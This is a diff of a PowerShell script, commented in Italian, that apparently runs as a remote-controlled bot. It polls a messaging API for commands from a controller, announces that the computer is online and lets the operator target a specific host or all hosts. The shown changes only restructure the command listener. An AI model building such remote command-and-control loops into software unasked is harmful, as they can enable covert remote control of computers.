@@ -95,6 +95,11 @@ function SendMessage ($output)
 
 function CommandListener
 {
+    $offset = 0
+    $hostia = $env:COMPUTERNAME
+    $hostname = $hostia
+    $wait = 1000
+
     try {
         Log "Invio un avviso al controller che il bot è stato avviato con successo"
         SendMessage "Computer online!"
@@ -102,18 +107,10 @@ function CommandListener
         Exit-PSSession
     }
 
-    $offset = 0
-    $hostia = $env:COMPUTERNAME
-    $hostname = $hostia
-    $wait = 1000
-
-    # lavorare sul messaggio e non sul message id oppure usare un array che si aggiorna all'ultimo id e verifica se l'ultimo id è in lista, se è in lista non fare un cazzo, altrimenti esegui
-
     while ($true) {        
         try {
             $message = Invoke-RestMethod -Method Get -Uri $api_get_updates -WebSession $session
-            if ($message.result.Count -gt 0) {                
-                if ($message.result.Count -gt $offset) {
+            if (($message.result.Count -gt 0) -and ($message.result.Count -gt $offset)) {
                     if ($offset -eq 0) {
                         $offset = $message.result.Count
                         Start-Sleep -Seconds 1
@@ -126,17 +123,18 @@ function CommandListener
                     $text       = $message.text
                     $document   = $message.document
                     
-                    Log $offset
                     if ($text.Length -gt 0) {
                         $check_command = $text.Split()
                         if ($check_command[0] -match "SET") {
-                            if ($check_command[1] -match $hostia) {
-                                $hostname = $check_command[2]
-                                SendMessage "Bot impostato per lavorare solo sull'host [$($hostname)]"
-                                continue
+                            if ($check_command[1] -match "ALL") {
+                                $hostname = $hostia
+                            } else {
+                                $hostname = $check_command[1]
                             }
-                        } elseif ($check_command[0] -match "ONLINE") {
-                            Log $offset
+                            continue
+                        }
+                        
+                        if ($check_command[0] -match "ONLINE") {
                             SendMessage "Computer operativo"
                             continue
                         }
@@ -176,8 +174,7 @@ function CommandListener
                             SendMessage $unauth_user_found
                         }
                     }
-                    $wait = 900                
-                }
+                    $wait = 900
             }
 
             if ($wait -eq 10000) {
